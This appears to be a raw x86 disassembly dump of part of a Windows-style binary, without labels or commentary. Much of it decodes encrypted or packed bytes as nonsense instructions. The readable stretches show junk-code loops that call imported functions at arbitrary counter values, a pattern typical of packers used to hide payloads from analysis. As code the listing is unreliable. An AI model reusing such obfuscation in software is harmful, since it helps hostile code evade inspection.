  4030ac:	pop    edx
  4030ad:	loopne 0x4030a8
  4030af:	sub    al,0xcc
  4030b1:	out    0x6b,eax
  4030b3:	jmp    0xd72b08
  4030b8:	in     eax,dx
  4030b9:	or     esp,DWORD PTR [esi-0x3c]
  4030bc:	adc    DWORD PTR [edx+edx*4+0x35],ebx
  4030c0:	xchg   BYTE PTR [edx+ebx*2-0x18],dh
  4030c4:	sbb    al,0xeb
  4030c6:	fst    DWORD PTR [ebx]
  4030c8:	mov    ah,BYTE PTR [ebx+0x7657c17b]
  4030ce:	arpl   WORD PTR [eax],di
  4030d0:	sub    DWORD PTR [eax+0x7f],esp
  4030d3:	push   0x3b8fe469
  4030d8:	xor    al,BYTE PTR [ebx+edx*4]
  4030db:	sub    BYTE PTR [edx+esi*2-0x60c59cbd],0xa5
  4030e3:	js     0x4030c6
  4030e5:	xchg   ecx,eax
  4030e6:	retf   
  4030e7:	mov    edi,0x4f09de1a
  4030ec:	pop    esp
  4030ed:	sti    
  4030ee:	jmp    0x1fa02938
  4030f3:	push   es
  4030f4:	(bad)  
  4030f6:	lds    esi,FWORD PTR [eax]
  4030f8:	mov    BYTE PTR [eax-0x5473307e],dh
  4030fe:	jns    0x403146
  403100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403101:	push   ecx
  403102:	xor    ch,BYTE PTR [esi+0x48f535a1]
  403108:	mov    ebp,0xbdc63656
  40310d:	xor    al,0x4a
  40310f:	aad    0x6a
  403111:	push   ss
  403112:	cmc    
  403113:	pop    ebp
  403114:	cs push 0xffffffe0
  403117:	lahf   
  403118:	jle    0x403169
  40311a:	cwde   
  40311b:	and    esi,DWORD PTR [ecx]
  40311d:	fdiv   QWORD PTR [eax-0x18]
  403120:	jmp    0x681a:0x4ede0981
  403127:	push   ebp
  403128:	pop    ecx
  403129:	pop    edx
  40312a:	nop
  40312b:	dec    ebx
  40312c:	pop    ebx
  40312d:	popa   
  40312e:	cmp    edi,esp
  403130:	mov    dl,0xe1
  403132:	xchg   BYTE PTR [ebx+eiz*1+0x2d93693a],cl
  403139:	or     edx,esp
  40313b:	cmp    bh,bh
  40313d:	push   eax
  40313e:	dec    BYTE PTR [ebx+0xd8bc845]
  403144:	mov    al,0x3b
  403146:	inc    ecx
  403147:	add    BYTE PTR [ecx],al
  403149:	or     BYTE PTR [edi-0x17],bl
  40314c:	pushf  
  40314d:	add    DWORD PTR [eax],eax
  40314f:	add    BYTE PTR [edx],al
  403151:	adc    DWORD PTR [eax+0x21b389ab],ecx
  403157:	mov    cl,0x82
  403159:	xchg   edx,eax
  40315a:	pop    esp
  40315b:	sar    esi,0xc5
  40315e:	sub    al,0xae
  403160:	mov    edx,0xfa7e7e17
  403165:	jg     0x4031e5
  403167:	jle    0x40316f
  403169:	sub    BYTE PTR [edx+0x6e147626],bl
  40316f:	pop    ecx
  403171:	ficomp DWORD PTR [ecx+0x5d]
  403174:	in     eax,0x5f
  403176:	call   0x3b54:0x1b478406
  40317d:	dec    ebp
  40317e:	mov    ebx,0xf1a1b783
  403183:	push   esp
  403184:	or     al,0xcb
  403186:	inc    ebx
  403187:	rcl    BYTE PTR [edx+ebx*1-0x25],cl
  40318b:	mov    cl,0xb1
  40318d:	(bad)  
  40318f:	and    esp,edi
  403191:	into   
  403192:	gs int3 
  403194:	out    dx,al
  403195:	inc    edi
  403196:	retf   0xef33
  403199:	in     eax,dx
  40319a:	imul   edx,DWORD PTR [ebx+ecx*1+0x32213c7c],0x2978ea0e
  4031a5:	ja     0x403216
  4031a7:	shl    BYTE PTR [esi],0x50
  4031aa:	icebp  
  4031ab:	in     eax,0x67
  4031ad:	loope  0x4031da
  4031af:	pusha  
  4031b0:	stos   BYTE PTR es:[edi],al
  4031b1:	xchg   ebp,eax
  4031b2:	xor    bl,BYTE PTR [esi]
  4031b4:	montmul (bad)
  4031b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031b6:	inc    ebx
  4031b7:	repnz aad 0xf9
  4031ba:	push   es
  4031bb:	pop    esp
  4031bc:	jge    0x40317e
  4031be:	pop    eax
  4031bf:	jae    0x403185
  4031c1:	push   0x65
  4031c3:	leave  
  4031c4:	clc    
  4031c5:	adc    edx,DWORD PTR [ebp-0x3d5039ea]
  4031cb:	jne    0x403208
  4031cd:	aam    0xf7
  4031cf:	hlt    
  4031d0:	jns    0x40316c
  4031d2:	(bad)  
  4031d3:	std    
  4031d4:	imul   esp,eax,0x75
  4031d7:	sub    DWORD PTR ds:0x6d8860e,edi
  4031dd:	xor    al,0xd6
  4031df:	das    
  4031e0:	sbb    DWORD PTR [ebx-0x2c],esp
  4031e3:	mov    ecx,0xdb5d9459
  4031e8:	les    eax,FWORD PTR [ecx+0x3dbf6b0d]
  4031ee:	cmp    BYTE PTR [eax+ecx*1],cl
  4031f1:	adc    BYTE PTR [edi+0x7007be73],bh
  4031f7:	mov    dh,0x61
  4031f9:	xchg   ebx,eax
  4031fa:	fadd   st,st(1)
  4031fc:	cli    
  4031fd:	xor    al,0xca
  4031ff:	(bad)  
  403200:	mov    ecx,0xb2f89d35
  403205:	(bad)  
  403206:	push   ebp
  403207:	sbb    ebx,DWORD PTR [ebx+0x7e]
  40320a:	je     0x403240
  40320c:	lds    edi,FWORD PTR [edx+0x5a44fbd2]
  403212:	outs   dx,DWORD PTR ds:[esi]
  403213:	call   0x124e:0xe71449f8
  40321a:	push   ebx
  40321b:	nop
  40321c:	fist   WORD PTR [edx-0xa]
  40321f:	add    BYTE PTR [esp+ebp*4+0x25],al
  403223:	in     eax,dx
  403224:	mov    edx,0x6c6f271d
  403229:	imul   ebp,DWORD PTR [eax],0xffffffc1
  40322c:	call   0x4bcedc2e
  403231:	add    eax,0x189e42e5
  403236:	or     edi,ebp
  403238:	inc    ecx
  403239:	(bad)  
  40323a:	aad    0x4e
  40323c:	leave  
  40323d:	call   0xf96bed35
  403242:	ja     0x4031d9
  403244:	shr    DWORD PTR [ebx],cl
  403246:	push   eax
  403247:	das    
  403248:	test   eax,0x1bfb73b7
  40324d:	sub    BYTE PTR [esi],0x4
  403250:	inc    edi
  403251:	and    ebx,edi
  403253:	cwde   
  403254:	js     0x40325c
  403256:	push   ss
  403257:	mov    ds:0x649ecf58,al
  40325c:	push   esp
  40325d:	sbb    esi,DWORD PTR [edi]
  40325f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403260:	pop    edx
  403261:	bound  edx,QWORD PTR [ebx]
  403263:	cmp    ch,bl
  403265:	mov    dl,0x7e
  403267:	jns    0x403259
  403269:	rol    BYTE PTR [ebx+0x68],0x7f
  40326d:	xchg   ebp,eax
  40326e:	dec    esp
  40326f:	out    0xb6,eax
  403271:	push   es
  403272:	das    
  403273:	inc    esp
  403274:	xchg   esp,eax
  403275:	test   al,0x8e
  403277:	cli    
  403278:	out    dx,al
  403279:	mov    WORD PTR [edi+0x3852883],?
  40327f:	stos   DWORD PTR es:[edi],eax
  403280:	sbb    BYTE PTR [esi],al
  403282:	push   cs
  403283:	mov    BYTE PTR [esp+eax*8-0x4313c5b0],dh
  40328a:	mov    ss,WORD PTR [esi]
  40328c:	add    BYTE PTR [edi+0x10],cl
  40328f:	neg    DWORD PTR [ebp+0x3cf49fd9]
  403295:	shl    dl,1
  403297:	add    al,0xc2
  403299:	cmp    bh,BYTE PTR [ebx-0x27]
  40329c:	mov    ch,0x10
  40329e:	push   edi
  40329f:	push   ebx
  4032a0:	push   cs
  4032a1:	enter  0x715e,0xad
  4032a5:	xchg   edi,eax
  4032a6:	std    
  4032a7:	xchg   edi,eax
  4032a8:	jl     0x4032d3
  4032aa:	jne    0x40327e
  4032ac:	in     eax,dx
  4032ad:	retf   0xecfe
  4032b0:	sti    
  4032b1:	(bad)  
  4032b2:	out    dx,eax
  4032b3:	pop    ds
  4032b4:	jns    0x403266
  4032b6:	pop    edx
  4032b7:	sub    BYTE PTR [esp+eax*8-0x4b],ch
  4032bb:	mov    al,0xd5
  4032bd:	fisttp DWORD PTR [ecx]
  4032bf:	xchg   ebp,eax
  4032c0:	scas   eax,DWORD PTR es:[edi]
  4032c1:	ins    BYTE PTR es:[edi],dx
  4032c2:	mov    ds:0x576f1d,eax
  4032c7:	out    0xb0,al
  4032c9:	fs pop edi
  4032cb:	js     0x4032b9
  4032cd:	adc    eax,DWORD PTR [ebp-0x44]
  4032d0:	xor    BYTE PTR [ecx-0x38],0x53
  4032d4:	mov    ch,0x5c
  4032d6:	adc    al,0x24
  4032d8:	dec    eax
  4032d9:	cdq    
  4032da:	adc    DWORD PTR [ebx+0x668bfe02],edi
  4032e0:	arpl   WORD PTR [ebx-0x510976af],sp
  4032e6:	and    BYTE PTR [edx+0x15a8be9c],al
  4032ec:	pop    esi
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43365b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43365b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43365b,ecx
  40331d:	cmp    DWORD PTR ds:0x43365b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43365b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4336ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4336d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43361f
  40336b:	add    DWORD PTR ds:0x433603,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433657,0x1e
  40338b:	cmp    DWORD PTR ds:0x433657,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433657,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433657,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433657
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433657,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433657
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433657,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4336e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433647
  4033f2:	mov    edi,DWORD PTR ds:0x433687
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433667,0x1c
  40340f:	cmp    DWORD PTR ds:0x433667,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433667,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433667,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433667
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433667,edi
  40344c:	mov    edi,DWORD PTR ds:0x433667
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433667,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4336e3
  403467:	and    edx,DWORD PTR ds:0x433717
  40346d:	mov    DWORD PTR ds:0x4336e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43369b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43371f
  40349f:	adc    DWORD PTR ds:0x4335ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433717,0x10
  4034c6:	cmp    DWORD PTR ds:0x433717,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433717,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433717,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433717
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433717,edi
  403505:	mov    edi,DWORD PTR ds:0x433717
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433717,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43372b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x40ed48a]
  403537:	arpl   WORD PTR [ecx],sp
  403539:	(bad)  
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	aaa    
  403542:	mov    ah,0x25
  403544:	push   0xffffff81
  403546:	push   esp
  403547:	mov    al,0x24
  403549:	in     eax,dx
  40354a:	mov    edx,0x6397289b
  40354f:	stc    
  403550:	mov    edi,0x603ba3b6
  403555:	mov    cl,0xec
  403557:	mov    ds:0x6567c19e,eax
  40355c:	push   0xbc20efe1
  403561:	out    0x41,eax
  403563:	add    al,0x74
  403565:	loop   0x40353f
  403567:	cmp    eax,0xbfa01d1f
  40356c:	repnz sti 
  40356e:	sub    eax,0x658c46e4
  403573:	pop    ecx
  403574:	adc    ebp,DWORD PTR [edx+ebx*2-0x2b]
  403578:	inc    ecx
  403579:	xchg   ebp,eax
  40357a:	mov    al,ds:0xc04e1f0c
  40357f:	mov    al,ss:0x7d015e93
  403585:	sti    
  403586:	cmp    BYTE PTR [ebx-0x50],ch
  403589:	mov    ebx,0xd583aa5b
  40358e:	pop    edx
  40358f:	mov    esp,0x6da7b4c
  403594:	pop    ebx
  403595:	push   ecx
  403596:	jae    0x403521
  403598:	ror    edx,1
  40359a:	pop    esi
  40359b:	mov    ah,0x3b
  40359d:	enter  0xf0c5,0x94
  4035a1:	out    0xab,al
  4035a3:	xchg   DWORD PTR [eax],esp
  4035a5:	xchg   ebp,eax
  4035a6:	leave  
  4035a7:	aas    
  4035a8:	fdiv   DWORD PTR [edi-0x1f]
  4035ab:	leave  
  4035ac:	ins    BYTE PTR es:[edi],dx
  4035ad:	data16 daa 
  4035af:	lahf   
  4035b0:	add    al,0xf2
  4035b2:	add    eax,0xd64c8023
  4035b7:	rol    eax,1
  4035b9:	add    BYTE PTR [ebx+0x77],bl
  4035bc:	push   es
  4035bd:	inc    ebp
  4035bf:	sub    esp,ecx
  4035c1:	inc    ecx
  4035c2:	jmp    0x8a:0x8bb247c8
  4035c9:	inc    ebp
  4035ca:	mov    eax,ds:0xda113f5d
  4035cf:	add    dl,BYTE PTR [esi+0x6ea8c228]
  4035d5:	lock scas eax,DWORD PTR es:[edi]
  4035d7:	leave  
  4035d8:	add    DWORD PTR [eax+edi*1-0x7f],edi
  4035dc:	stc    
  4035dd:	mov    BYTE PTR [ebp+0x75],al
  4035e0:	xchg   ebx,eax
  4035e1:	or     dl,BYTE PTR [esi-0x21bec53c]
  4035e7:	jns    0x403603
  4035e9:	xchg   esp,eax
  4035ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035eb:	ror    DWORD PTR [esp+esi*4+0x5f82881e],1
  4035f2:	jne    0x40358c
  4035f4:	xor    dl,cl
  4035f6:	clc    
  4035f7:	loope  0x4035f7
  4035f9:	push   0x44
  4035fb:	fcomp  QWORD PTR [ebx+0x59]
  4035fe:	scas   eax,DWORD PTR es:[edi]
  4035ff:	ror    ecx,0x52
  403602:	es retf 
  403604:	sar    DWORD PTR [ecx-0x334d5da8],1
  40360a:	repnz cmp al,0x33
  40360d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40360e:	jbe    0x4035df
  403610:	cdq    
  403611:	mov    ecx,0x7d65b3a
  403616:	xchg   esp,eax
  403617:	add    edi,ebp
  403619:	ja     0x403692
  40361b:	in     eax,0x3c
  40361d:	es ja  0x403687
  403620:	sahf   
  403621:	dec    ecx
  403622:	push   eax
  403623:	mov    edi,0xfab0061
  403628:	push   edi
  403629:	fwait
  40362a:	xor    BYTE PTR [ebp+0x57],ah
  40362d:	pop    ss
  40362e:	dec    edi
  40362f:	in     eax,dx
  403630:	lahf   
  403631:	push   ds
  403632:	fnstsw WORD PTR [esi-0x3212e9f5]
  403638:	repnz (bad) 
  40363a:	call   0xa8174f1c
  40363f:	pop    edx
  403640:	push   0x9793de03
  403645:	aaa    
  403646:	mov    ecx,0x3fa9e0aa
  40364b:	mov    BYTE PTR [ebx+0x6e],0x6e
  40364f:	sub    al,bh
  403651:	jge    0x40363c
  403653:	(bad)  
  403654:	jno    0x40367e
  403656:	pop    ds
  403657:	sbb    eax,DWORD PTR [ebp*2-0x4f73b98a]
  40365e:	pop    esi
  40365f:	push   ecx
  403660:	cdq    
  403661:	call   0x8c454be0
  403666:	xor    eax,0x1d8c4314
  40366b:	std    
  40366c:	mov    bl,0x26
  40366e:	imul   ebp,DWORD PTR [ecx-0x5146b88],0x77
  403675:	enter  0x5a3c,0x7
  403679:	pop    ebx
  40367a:	dec    ebp
  40367b:	push   eax
  40367c:	inc    ebp
  40367d:	addr16 mov ds:0x3328,eax
  403681:	pop    ebp
  403682:	sbb    al,0x2e
  403684:	bound  ebx,QWORD PTR [eax-0xd]
  403687:	mov    esi,0x4a5c35e
  40368c:	inc    edi
  40368d:	xchg   edi,eax
  40368e:	aad    0xe5
  403690:	(bad)
  403694:	in     al,0x91
  403696:	ret    
  403697:	xchg   edi,eax
  403698:	arpl   WORD PTR ds:[esi+0x63487338],bp
  40369f:	add    dh,BYTE PTR [edi-0x18]
  4036a2:	pop    esp
  4036a3:	test   eax,0xc1e1bced
  4036a8:	fmul   QWORD PTR [ebx-0x4d]
  4036ab:	xchg   edx,eax
  4036ac:	add    cl,dh
  4036ae:	fdivp  st(6),st
  4036b0:	mov    al,0x9
  4036b2:	xchg   edi,eax
  4036b3:	dec    BYTE PTR [eax]
  4036b5:	jecxz  0x4036dd
  4036b7:	xor    BYTE PTR [ebx],dh
  4036b9:	xor    ah,dl
  4036bb:	std    
  4036bc:	inc    esp
  4036bd:	shl    DWORD PTR [esi+0x44],1
  4036c0:	mov    edi,0xb839392a
  4036c5:	in     al,dx
  4036c6:	mov    ds:0x3e9f93ff,eax
  4036cb:	ins    DWORD PTR es:[edi],dx
  4036cc:	mov    edx,0xdfd1ca0b
  4036d1:	popa   
  4036d2:	and    ecx,DWORD PTR [edx+0x9]
  4036d5:	pop    edi
  4036d6:	ins    BYTE PTR es:[edi],dx
  4036d7:	push   ss
  4036d8:	cwde   
  4036d9:	sahf   
  4036da:	ja     0x40369b
  4036dc:	and    BYTE PTR [ecx+edi*1],dl
  4036df:	ffree  st(5)
  4036e1:	or     al,0x54
  4036e3:	clc    
  4036e4:	aad    0x7
  4036e6:	dec    ebx
  4036e7:	in     al,dx
  4036e8:	call   0x19a7:0x1a461483
  4036ef:	dec    esp
  4036f0:	out    0x9c,eax
  4036f2:	pop    ebp
  4036f3:	pop    esp
  4036f4:	(bad)  
  4036f5:	push   0x63ac0efe
  4036fa:	xchg   ebp,eax
  4036fb:	call   0x4f58:0x3d40242a
  403702:	and    bl,BYTE PTR ds:0x53379dc0
  403708:	sbb    al,0x31
  40370a:	jb     0x403773
  40370c:	add    eax,0xdce9b19b
  403711:	out    dx,eax
  403712:	xor    DWORD PTR [esi-0x11d9448a],ebx
  403718:	mov    eax,0xdd10c40c
  40371d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40371e:	imul   edx,DWORD PTR [ebx],0x5e
  403721:	cli    
  403722:	jne    0x4036c6
  403724:	xlat   BYTE PTR ds:[ebx]
  403725:	into   
  403726:	ret    0xad9e
  403729:	mov    ch,0xdc
  40372b:	pushf  
  40372c:	cmp    eax,0x93e77aa2
  403731:	cmp    BYTE PTR [edi],0xef
  403734:	ret    0xb835
  403737:	in     eax,0xf7
  403739:	jmp    0x18b5:0xf0e7c1e8
  403740:	add    DWORD PTR [esi],ebp
  403742:	nop
  403743:	jne    0x4036d6
  403745:	das    
  403746:	sahf   
  403747:	icebp  
  403748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403749:	je     0x4036fc
  40374b:	jnp    0x403745
  40374d:	sbb    eax,0xd2510c49
  403752:	pop    ss
  403753:	std    
  403754:	push   eax
  403755:	add    DWORD PTR ds:[eax-0x599ebda1],ebp
  40375c:	scas   eax,DWORD PTR es:[edi]
  40375d:	sbb    esp,esp
  40375f:	mov    bl,0xcb
  403761:	mov    esi,0x3ba923c6
  403766:	push   eax
  403767:	jl     0x40373b
  403769:	jge    0x403718
  40376b:	sub    eax,0x4ec8ba49
  403770:	mov    bl,BYTE PTR [edx-0x71bb989d]
  403776:	adc    DWORD PTR [edx+0x641dd1db],esi
  40377c:	retf   
  40377d:	enter  0xcc78,0x22
  403781:	ds sub dh,ah
  403784:	in     al,dx
  403785:	inc    edx
  403786:	jbe    0x403736
  403788:	sub    BYTE PTR [ebp+0xb97826],0x7d
  40378f:	stos   DWORD PTR es:[edi],eax
  403790:	cmp    BYTE PTR [ebx],dl
  403792:	ins    DWORD PTR es:[edi],dx
  403793:	rol    ah,0x1
  403796:	call   0xa39d1830
  40379b:	fcomp  QWORD PTR [ecx]
  40379d:	mov    ecx,0x2beb4fa0
  4037a2:	out    0xa9,eax
  4037a4:	cmp    DWORD PTR fs:[eax+0x13],eax
  4037a8:	mov    cl,0xe9
  4037aa:	sub    eax,DWORD PTR [ebp+0x27]
  4037ad:	add    al,0xb2
  4037af:	loopne 0x403733
  4037b1:	cwde   
  4037b2:	mov    bh,0xeb
  4037b4:	pop    edi
  4037b5:	retf   
  4037b6:	dec    edi
  4037b7:	ficomp WORD PTR [ecx+0x224e248b]
  4037bd:	ror    DWORD PTR [esp+eiz*8],cl
  4037c0:	sbb    esi,DWORD PTR [ebp+0x5e]
  4037c3:	and    dh,BYTE PTR [eax+esi*1-0x4a213b04]
  4037ca:	add    eax,0xe8cfd59
  4037cf:	popf   
  4037d0:	jo     0x403829
  4037d2:	add    DWORD PTR [edi+ebp*1],0xffffffcc
  4037d6:	cs cwde 
  4037d8:	in     eax,0x9c
  4037da:	cmp    edx,DWORD PTR [esi+0x673f468]
  4037e0:	adc    dh,dl
  4037e2:	pop    ebp
  4037e3:	leave  
  4037e4:	shl    BYTE PTR [eax+ecx*8],1
  4037e7:	push   esi
  4037e8:	xor    eax,DWORD PTR [eax-0x5c]
  4037eb:	cmp    BYTE PTR gs:[esi-0x132aca27],0xe3
  4037f3:	pop    edx
  4037f4:	aad    0x2
  4037f6:	jge    0x4037d2
  4037f8:	neg    ebp
  4037fa:	inc    edi
  4037fb:	sbb    edi,edi
  4037fd:	xchg   esi,eax
  4037fe:	dec    esi
  4037ff:	dec    eax
  403800:	outs   dx,BYTE PTR ds:[esi]
  403801:	lds    esi,FWORD PTR [edx+0x24]
  403804:	push   0xffffff89
  403806:	sub    ecx,ecx
  403808:	jl     0x4037ea
  40380a:	jge    0x4037f7
  40380c:	dec    eax
  40380d:	adc    eax,0x6345e145
  403812:	jne    0x403810
  403814:	int3   
  403815:	pop    ss
  403816:	pop    edx
  403817:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403818:	dec    esi
  403819:	xchg   ebp,eax
  40381a:	jb     0x4037fa
  40381c:	or     eax,0x50d473de
  403821:	int    0x41
  403823:	mov    ebx,0xc7f95c57
  403828:	inc    ebp
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x35fb3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	stos   DWORD PTR es:[edi],eax
  40383a:	ss inc ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x43372725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x433727
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433727,edi
  403858:	cmp    DWORD PTR ds:0x433727,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433727,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433727
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433727,edi
  40389c:	cmp    DWORD PTR ds:0x433727,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43366b,0x43372b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433693,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4336eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433727,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4336eb,0x4336ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4335fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433617,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433613,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43371b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4335ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4335ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4335ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4335ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4335ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4335ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4335ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4335ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433667
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433613
  4039a6:	sub    edi,DWORD PTR ds:0x433723
  4039ac:	mov    DWORD PTR ds:0x433613,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433607,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433607,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433607,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433607
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433607,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433617
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4335fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4335fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4335fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4335fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4335fb,0x1e
